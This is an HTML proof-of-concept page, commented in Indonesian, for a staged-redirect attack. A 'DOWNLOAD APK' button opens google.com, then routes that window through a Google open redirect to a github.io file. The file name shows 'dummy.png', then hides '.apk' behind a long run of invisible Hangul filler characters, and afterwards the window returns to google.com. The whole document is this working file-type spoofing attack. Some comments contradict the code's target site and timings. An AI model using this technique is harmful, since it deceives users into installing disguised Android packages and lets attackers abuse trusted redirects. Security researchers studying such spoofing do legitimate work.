<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="utf-8">
    <title>Redirect Bertahap PoC</title>
    <style>
        .button {
            border: none;
            color: white;
            padding: 15px 32px;
            text-align: center;
            font-size: 16px;
            cursor: pointer;
            background-color: #4CAF50;
        }
    </style>
</head>
<body>

<script>
function a() {
    const start = Date.now();
    console.log("Window opened at", start);

    // Step 1: buka apple.com
    let win = window.open('https://google.com', 'x');

    // Step 2: redirect sangat cepat (±100 ms)
    setTimeout(function () {
        console.log("Redirect 1 after", Date.now() - start, "ms");
        win.location.href =
            'https://www.google.com/url?q=https%3A%2F%2Fecdnts-del.github.io%2Ftest-apk%2Fdummy.png%25E3%2585%25A4%25E3%2585%25A4%25E3%2585%25A4%25E3%2585%25A4%25E3%2585%25A4%25E3%2585%25A4%25E3%2585%25A4%25E3%2585%25A4%25E3%2585%25A4%25E3%2585%25A4%25E3%2585%25A4%25E3%2585%25A4%25E3%2585%25A4%25E3%2585%25A4%25E3%2585%25A4%25E3%2585%25A4%25E3%2585%25A4%25E3%2585%25A4%25E3%2585%25A4%25E3%2585%25A4%25E3%2585%25A4.apk&sa=D&sntz=1&usg=AOvVaw1nf4doZk0mt44E5Tg0kXgh';

        // Step 3: redirect berikutnya (opsional, 900 ms)
        setTimeout(function () {
            console.log("Redirect 2 after", Date.now() - start, "ms");
            win.location.href = 'https://google.com';
        }, 3000);

    }, 2000);
}
</script>

<center>
    <input type="button" class="button" value="DOWNLOAD APK" onclick="a()">
</center>

</body>
</html>
